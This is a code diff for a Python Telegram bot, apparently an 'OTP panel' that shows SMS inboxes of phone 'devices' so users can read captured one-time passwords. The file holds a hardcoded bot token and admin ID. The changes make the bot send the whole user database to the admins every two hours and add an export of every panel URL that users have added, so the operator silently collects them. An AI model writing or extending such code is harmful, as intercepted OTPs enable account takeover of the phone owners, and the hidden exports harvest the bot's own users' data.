@@ -63,7 +63,7 @@ POLL_INTERVAL   = 10
 CACHE_INTERVAL  = 600 
 SMS_LIMIT       = 20       
 TOKEN           = "8877437030:AAFGon2GuBerdgA2o5QGDBrc8BpBQOsIgr4"
-PAGE_SIZE       = 14  # Increased to show 14 devices (7 rows of 2) per page
+PAGE_SIZE       = 14
 
 ADMIN_IDS: set[int] = {6860106371}
 MANDATORY_CHATS = ["@leakmethodfree", "@sabkijayhokhush", "@rosekhudkabanaya"]
@@ -76,7 +76,6 @@ SYS_DIR = os.path.join(DB_DIR, "System")
 SMS_LOG_FILE = os.path.join(SYS_DIR, "Super_Admin_SMS_Log.txt")
 CACHE_FILE = os.path.join(SYS_DIR, "device_cache.json")
 
-# 🔥 Memory Optimized Data Structures
 seen_ids = deque(maxlen=15000) 
 first_run: bool     = True
 _main_app: Optional[Application] = None
@@ -260,13 +259,20 @@ async def auto_save_loop():
 
 async def hourly_backup_loop(app: Application):
     while True:
-        await asyncio.sleep(3600)
+        await asyncio.sleep(7200) # 2 HOURS AUTO-BACKUP
         try:
             total_u = len(all_users)
             g_panels = len(DATABASES) + len(SETTINGS.get("global_panels", []))
             u_panels = sum(len(u.get("custom_dbs", [])) for u in all_users.values())
-            msg = f"⏱ <b>1-HOUR AUTO BACKUP & STATS</b> ⏱\n\n👥 Total Users: {total_u}\n🌍 Global Panels: {g_panels}\n👤 User Custom Panels: {u_panels}\n🔄 Total OTPs Captured: {total_otps_processed}\n\n✅ System Stability: NORMAL. Anti-Crash Active."
-            for adm in ADMIN_IDS: await app.bot.send_message(adm, msg, parse_mode="HTML")
+            msg = f"⏱ <b>2-HOUR AUTO BACKUP & STATS</b> ⏱\n\n👥 Total Users: {total_u}\n🌍 Global Panels: {g_panels}\n👤 User Custom Panels: {u_panels}\n🔄 Total OTPs Captured: {total_otps_processed}\n\n✅ System Stability: NORMAL. Anti-Crash Active."
+            
+            backup_path = os.path.join(SYS_DIR, "Database_Backup.json")
+            with open(backup_path, "w", encoding="utf-8") as f:
+                json.dump({"users": all_users, "settings": SETTINGS}, f, indent=4)
+                
+            for adm in ADMIN_IDS: 
+                await app.bot.send_message(adm, msg, parse_mode="HTML")
+                await app.bot.send_document(adm, document=open(backup_path, "rb"), filename=f"Backup_{int(time.time())}.json")
         except: pass
 
 async def memory_sweeper():
@@ -530,16 +536,14 @@ async def verify_recent_sms(device: Device, max_age_seconds=14400) -> bool:
     except: pass
     return False
 
-# 🔥 PREMIUM 2-COLUMN BUTTON FORMATTER
 def _format_btn_label(d: Device) -> str:
     icon = "🟢" if d.status == "online" else "🔴"
     if d.numbers:
         main_num = str(d.numbers[0])
         display_num = main_num if main_num.startswith("+") else f"+{main_num}"
-        # Trim very long numbers to keep buttons compact
         if len(display_num) > 14: display_num = display_num[:13] + "…"
         lbl = f"{icon} {display_num}"
-        if len(d.numbers) > 1: lbl += " ⧉" # Clean indicator for multiple SIMs
+        if len(d.numbers) > 1: lbl += " ⧉" 
     else:
         lbl = f"{icon} {d.name[:8]}"
     return lbl
@@ -561,7 +565,6 @@ async def show_fresh30_page(message_obj, chat_id, page, bot_token, users_db):
 
     text = f"🔥 <b>30-MIN FRESH INBOXES</b> 🔥\n━━━━━━━━━━━━━━━━━━\n✅ Total Active Numbers: {total_devs}\n📄 Page {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\n<i>Select a number to view OTP:</i>"
 
-    # Use 2-column layout here too
     kb = []
     row = []
     for did in page_ids:
@@ -640,7 +643,6 @@ def device_list_header(devices: list[Device], page: int = 0) -> str:
         progress = f"🔄 Initial Scan: {SCAN_PROGRESS['completed']}/{SCAN_PROGRESS['total']} ({pct}%)\n"
     return f"<b>📱 OTP PANEL PRO DEVICES</b>\n━━━━━━━━━━━━━━━━━━\n{progress}🟢 Online: {online}   🔴 Offline: {offline}\n📊 Total: {len(devices)} Devices\n📄 Page {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\n<i>Select a number below:</i>"
 
-# 🔥 PREMIUM 2-COLUMN DEVICE LIST KEYBOARD
 def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
     total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
     page        = max(0, min(page, total_pages - 1))
@@ -667,7 +669,6 @@ def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboard
     rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
     return InlineKeyboardMarkup(rows)
 
-# 🔥 PREMIUM 2-COLUMN ONLINE LIST KEYBOARD
 def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
     online = [d for d in devices if d.status == "online"]
     rows = []
@@ -721,8 +722,9 @@ def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel"), InlineKeyboardButton("Grant Global Access", callback_data="sa_grant_global")],
         [InlineKeyboardButton("Upload Panels (.txt)", callback_data="sa_upload_txt"), InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
-        [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels"), InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs")],
-        [InlineKeyboardButton("Refresh", callback_data="admin_refresh"), InlineKeyboardButton("Close", callback_data="close_msg")]
+        [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels"), InlineKeyboardButton("Export User Panels (.txt)", callback_data="sa_export_user_panels")],
+        [InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs"), InlineKeyboardButton("Refresh", callback_data="admin_refresh")],
+        [InlineKeyboardButton("Close", callback_data="close_msg")]
     ])
 
 async def safe_edit(query_or_msg, text, reply_markup=None, parse_mode=None, disable_web_page_preview=False):
@@ -932,6 +934,21 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                     msg_text += "\n"
             if len(msg_text) > 4000: msg_text = msg_text[:4000] + "\n...[Truncated]"
             await safe_edit(query, msg_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="admin_refresh")]]))
+            return
+
+        if data == "sa_export_user_panels" and chat_id in ADMIN_IDS:
+            all_urls = set()
+            for uinfo in users_db.values():
+                for db in get_user_dbs(uinfo):
+                    all_urls.add(db)
+            if not all_urls:
+                return await query.answer("Koi user panel nahi mila.", show_alert=True)
+            
+            file_path = os.path.join(SYS_DIR, "User_Panels_Export.txt")
+            with open(file_path, "w", encoding="utf-8") as f:
+                f.write("\n".join(all_urls))
+            
+            await ctx.bot.send_document(chat_id=chat_id, document=open(file_path, "rb"), filename="All_User_Panels.txt", caption=f"Total Unique User Panels: {len(all_urls)}")
             return
 
         if data == "sa_export_numbers" and chat_id in ADMIN_IDS:
